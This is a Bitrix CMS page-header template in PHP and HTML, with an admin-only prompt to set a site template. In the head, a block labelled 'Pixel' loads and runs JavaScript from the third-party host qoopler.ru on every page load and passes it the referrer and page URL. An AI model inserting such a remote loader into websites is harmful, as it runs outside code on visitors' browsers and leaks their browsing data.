<? if ( ! defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED !== true) {
    die();
}
    IncludeTemplateLangFile(__FILE__);
?>
    <html>
    <head>
        <? $APPLICATION->ShowHead(); ?>
        <title><? $APPLICATION->ShowTitle() ?></title>
<!-- Pixel -->
<script type="text/javascript">
(function (d, w) {
var n = d.getElementsByTagName("script")[0],
s = d.createElement("script");
s.type = "text/javascript";
s.async = true;
s.src = "https://qoopler.ru/index.php?ref="+d.referrer+"&page=" + encodeURIComponent(w.location.href);
n.parentNode.insertBefore(s, n);
})(document, window);
</script>
<!-- /Pixel -->
    </head>

<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" bgcolor="#FFFFFF">

<? $APPLICATION->ShowPanel() ?>

<? if ($USER->IsAdmin()): ?>

    <div style="border:red solid 1px">
        <form action="/bitrix/admin/site_edit.php" method="GET">
            <input type="hidden" name="LID" value="<?=SITE_ID?>"/>
            <p><font style="color:red"><? echo GetMessage("DEF_TEMPLATE_NF") ?> </font></p>
            <input type="submit" name="set_template" value="<? echo GetMessage("DEF_TEMPLATE_NF_SET") ?>"/>
        </form>
    </div>

<? endif ?>